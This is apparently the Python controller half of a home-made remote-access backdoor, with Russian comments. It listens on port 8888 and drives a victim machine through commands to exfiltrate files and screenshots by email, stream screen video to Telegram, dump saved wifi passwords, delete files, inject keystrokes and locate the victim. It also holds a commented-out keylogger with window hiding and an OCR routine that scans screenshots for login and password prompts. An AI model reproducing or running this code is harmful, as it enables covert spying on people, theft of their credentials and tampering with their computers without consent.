# Добавляем необходимые подклассы - MIME-типы

import subprocess

import socket, cv2

import stat
import os, time

global cd
cd = False

def waiting(s, client):
    client.close()
    s.close()
    print("Ждём..")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 8888))
    s.listen(5)
    client, addr = s.accept()
    time.sleep(10)

def ch_dir(dir):
    command = "ch_dir " + dir
    client.send(command.encode("cp866"))
    subprocess.getoutput("dir")

def py_to_exe(filename):
    client.send(("py_to_exe:" + filename).encode("cp65001"))
    print(client.recv(1024 * 1024 * 1024).decode("utf-8"))


"""
def def_hide():
    class myThread(threading.Thread):
        def __init__(self, threadID, name, counter):
            threading.Thread.__init__(self)
            self.threadID = threadID
            self.name = name
            self.counter = counter

        def run(self):
            main()
    
    def hide():
        import win32console, win32gui
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
        return True
    
    # Запуск кейлогера
    def main():
        hm.KeyDown = OnKeyboardEvent
        hm.HookKeyboard()
        pythoncom.PumpMessages()
    
    hide()
    hm = pyHook.HookManager()
    disallow_Multiple_Instances()
    thread = myThread(1, "Thread", 1)
    thread.start()
"""


def CalcImageHash(FileName):
    image = cv2.imread(FileName)  # Прочитаем картинку
    resized = cv2.resize(image, (8, 8), interpolation=cv2.INTER_AREA)  # Уменьшим картинку
    gray_image = cv2.cvtColor(resized, cv2.COLOR_BGR2GRAY)  # Переведем в черно-белый формат
    avg = gray_image.mean()  # Среднее значение пикселя
    ret, threshold_image = cv2.threshold(gray_image, avg, 255, 0)  # Бинаризация по порогу

    # Рассчитаем хэш
    _hash = ""
    for x in range(8):
        for y in range(8):
            val = threshold_image[x, y]
            if val == 255:
                _hash = _hash + "1"
            else:
                _hash = _hash + "0"

    return _hash

def CompareHash(hash1, hash2):
    l = len(hash1)
    i = 0
    count = 0
    while i < l:
        if hash1[i] != hash2[i]:
            count = count + 1
        i = i + 1
    return count


def read_file(command):
    client.send((command.encode("cp866")))
#send_email(dest_email, file)

def hlp():
    print("""
    // ─ ├ │ └ //
    //├───────────────────────────────────────────────────│
    //│util for backdoor to the computer by ip in one wifi│
    //├───────────────────────────────────────────────────│
    // ─ ├ │ └ //
    cd [-D] - CHANGE DIRECTORY OR DISK: -D - DIRECTORY
    ch_dir [-D] - CHANGE DIRECTORY OR DISK: -D - DIRECTORY
    cp_dir [-D] - COPY DIRECTORY TO THE EMAIL: -D - DIRECTORY
    cpy [-F] - COPY FILE TO THE EMAIL: -F - FILE
    hlp - SHOW THIS WINDOW
    send_video [-T] - SEND VIDEO TO THE TELEGRAM: -T - TIME (IN SECONDS)
    edit [-F] - EDIT TEXT FILE IN NOTEPAD: -F - FILE
    py_to_exe: [-F] - CONVERT PY FILE TO EXE FILE AND SAVE IN THE DIRECTORY WITH NAME OF THE FILE: -F - FILE
    read [-F] - READ TEXT FILE OR SHOW ALL FILES AND DIRECTORIES IN DIRECTORY: -F - FILE OR DIRECTORY
    delete [-F] - DELETE FILE FROM THE DIRECTORY: -F - FILE
    screenshot - SEND THE SCREENSHOT TO THE EMAIL
    make_d [-N] - MAKING DIRECTORY WITH NAME: -N - NAME
    show_geo - SHOWS GLOBAL, LOCAL IP, GEOLOCATION
    show_wifi_pass - SHOW SAVED WIFI PASSWORDS
    start -F - START FILE (LIKE DOUBLE CLICK): -F - FILE
    //def_hide - default alg to hide client program
    //send_v1deo - default alg to send screen video if computers are not connected (in 2 times faster)
    rasp_scr [-I] [-T] - SEARCHING SPECIAL STRING IN IMAGE: -I - IMAGE (DEFAULT NONE), -T TEXT
    kboard# [-C] - WORK WITH KEYBOARD: -C - COMMAND
        1. writeing [-T] - WRITEING TEXT TO THE COMP: -T - TEXT
        2. hotk [-K] [-T] - ADD HOTKEY TO WRITE TEXT: -K - KEY, -T - TEXT
    """)
    return None

def dub_edit():
    or_co1 = ""
    or_co = ""
    print("Input a code by a line:")
    while or_co1 != "abberation":
        or_co1 = input(">> ")
        if or_co1 != "abberation":
            or_co += or_co1
    return or_co

def rasp_scr(name_image):
    import os.path
    import cv2
    import easyocr
    #import matplotlib.pyplot as plt
    im_1_path = os.path.abspath(name_image)

    def recognize_text(img_path):
        txt = ""
        i1 = 0
        '''loads an image and recognizes text.'''
        reader = easyocr.Reader(['ru'])
        txt0 = reader.readtext(img_path)
        for i in txt0:
            txt += i[1]
            if "Ваш пароль" in txt or "Ваш логин" in txt:
                return "Yes"
        return txt
    result = recognize_text(im_1_path)
    return result


def rasp_scr1(name_image, string):
    import os.path
    import cv2
    import easyocr
    #import matplotlib.pyplot as plt
    im_1_path = os.path.abspath(name_image)

    def recognize_text(img_path):
        txt = ""
        i1 = 0
        '''loads an image and recognizes text.'''
        reader = easyocr.Reader(['ru'])
        txt0 = reader.readtext(img_path)
        for i in txt0:
            txt += i[1]
            if string in txt:
                print("Here")
                break
            """i1 += 1  
            if i[1] == "Войти":
                n = i1 - 5
                break"""
        return txt
    result = recognize_text(im_1_path)
#rasp_scr("test.png")

def edit(command):
    client.send(command.encode("cp65001"))
    r"""
    or_co = read_file(file)
    while or_co != "abberation":
        or_co += input("Input a code by a line>> ")
    client.send(("edit\n" + or_co).encode("cp65001"))
    """

'''from keyboard import add_hotkey, write, record, press_and_release
l_t = []
t = 0
add_hotkey('right', lambda: write(l_t[-t]))'''
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
local_ip = str(socket.gethostbyname(socket.gethostname()))
print(local_ip)
s.bind(("0.0.0.0", 8888))
s.listen(5)
client, addr = s.accept()
#keys = []
ch_dir_ch = False
cur_dir = client.recv(1024).decode("cp65001")
client.send(local_ip.encode("cp65001"))
while True:
    try:
        command = input(cur_dir + ">> ")
        '''recorded = record(until='esc')
        if "up" in recorded:
            press_and_release("esc")
            t += 1
            l_t.append(recorded[-1])
            recorded = []'''
        if "send_video" in command:
            client.send((command.encode("cp65001")))
            time.sleep(int(command.split(" ")[-1]))
        elif "py_to_exe" in command:
            fi = (command.split(":"))[-1]
            py_to_exe(fi)
        elif "read" in command:
            read_file(command)
            result_output = client.recv(4096 * 1024).decode("cp65001")
            print(result_output)
        elif "cd" in command:
            if not ch_dir_ch:
                #i = input("Did you mean 'ch_dir'? (Y/N)").lower()
                i = "y"
                if i == "y":
                    ch_dir((command.split(" "))[-1])
                    cur_dir = client.recv(1024).decode("cp65001")
                    #u = input("Do you want to change 'cd' command to 'ch_dir' automaticaly? (Y/N)").lower()
                    u = "y"
                    if u == "y":
                        ch_dir_ch = True
                        continue
                    else:
                        ch_dir_ch = False
                else:
                    print("Unavailable command.")
                    pass
            if ch_dir_ch:
                if "cd" in command:
                    command = "ch_dir " + (command.split(" "))[-1]
                    ch_dir((command.split(" "))[-1])
                    cur_dir = client.recv(1024).decode("cp65001")
        elif "ch_dir" in command:
            ch_dir((command.split(" "))[-1])
            cur_dir = client.recv(1024).decode("cp65001")
        elif "delete" in command:
            client.send((command.encode("cp65001")))
        elif command == "hlp":
            hlp()
            continue
        elif "make_d" in command:
            client.send((command.encode("cp65001")))
            cur_dir = client.recv(1024).decode("cp65001")
        elif command == "show_geo":
            client.send((command.encode("cp65001")))
            print((client.recv(4096).decode("cp65001")))
        elif "edit" in command:
            edit(command)
            original_code = client.recv(1024).decode("utf-8")
            print(original_code)

            #oc = dub_edit()

            with open("temp.txt", "w") as file:
                file.write(original_code)
                file.close()
            os.system("start temp.txt")
            ready = input("Are you ready? ")

            file = open("temp.txt", "r")
            p = file.read()
            #print(client.recv(1024).decode("cp65001"))
            client.send(p.encode("utf-8"))
            print(client.recv(1024).decode("utf-8"))
            file.close()
            os.chmod(os.path.abspath("temp.txt"), stat.S_IWRITE)
            os.system("del temp.txt")
        elif "kboard" in command:
            client.send(command.encode("cp65001"))
        elif "rasp_scr" in command:
            if len(command.split(" ")) > 1:
                rasp_scr1((command.split(" "))[1], (command.split(" "))[2])
            else:
                image = input("Input a name of the image>> ")
                text = input("Input a text>> ")
                rasp_scr1(image, text)
        elif "cd" not in command and command != "":
            client.send(command.encode("cp65001"))
            result_output = client.recv(4096).decode("cp65001").split("╨Т┬а")
            print(" ".join(result_output))
    except ConnectionResetError and ConnectionAbortedError:
        client.close()
        s.close()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", 8888))
        s.listen(5)
        client, addr = s.accept()
    except:
        client.close()
        s.close()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", 8888))
        s.listen(5)
        client, addr = s.accept()
client.close()
s.close()
